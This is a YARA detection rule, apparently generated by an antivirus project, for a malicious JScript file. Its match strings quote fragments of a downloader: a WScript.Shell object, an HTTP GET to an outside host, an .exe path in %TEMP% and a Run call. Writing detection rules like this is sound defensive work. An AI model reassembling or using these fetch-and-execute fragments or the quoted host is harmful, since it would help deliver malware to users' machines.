rule sig_20160328_16b8a6c6b87ba39abe0970cdedb15b96 {
  meta:
    description = "datamaliciousorder - file 20160328_16b8a6c6b87ba39abe0970cdedb15b96.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8130503ac31ed9618876b680ef3ffab49c58bf73053689d44451a87cd1adbd8d"

  strings:
    $s1  = "function Rovwsaa() {return Ubmemchzgg[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"9O20w9JJgu.exe\";};" fullword ascii
    $s2  = "Udrjb[Tqawv](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Dteiccn](Midmavekvx() * 11)} while (Udrjb[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Ubmemchzgg = function Ymtzyldayd() {return WScript[Wpkqgyv](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Qhpmf(Ivujtlrbg, Nvyhoo){return Ivujtlrbg - Nvyhoo;};" fullword ascii
    $s6  = "function Zivzit() {return ((Hlfsbqvwuv == true) && (Hlfsbqvwuv == Mdevpcik)) ? 1 : Ctfxkxhfc;};" fullword ascii
    $s7  = "function Vhzwlinea(Xxiolyge){Ubmemchzgg[\"Run\"](Xxiolyge, Ctfxkxhfc, Ctfxkxhfc);};" fullword ascii
    $s8  = "var Hhquoihe = false;" fullword ascii
    $s9  = "var Mklovc = new this[\"Date\"]();" fullword ascii
    $s10 = "function Oojzps()" fullword ascii
    $s11 = " while (Hwacj){" fullword ascii
    $s12 = "Hlfsbqvwuv = true; " fullword ascii
    $s13 = "return Qhpmf(Sqhzfczkm, Jjzzxn);" fullword ascii
    $s14 = "function Midmavekvx(){return 22;};" fullword ascii
    $s15 = "var Hlfsbqvwuv = false;" fullword ascii
    $s16 = "function Vvsqnz(){return Wpkqgyv;};" fullword ascii
    $s17 = "var Mdevpcik = false;" fullword ascii
    $s18 = "Mdevpcik = true; " fullword ascii
    $s19 = "function Fhfvezfl(){return Wwmdxfbhs;};" fullword ascii
    $s20 = "function Vqwbdtlvml(Eevlpck) {var Tyvrrclzr = (1, 2, 3, 4, 5, Eevlpck); return Tyvrrclzr;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}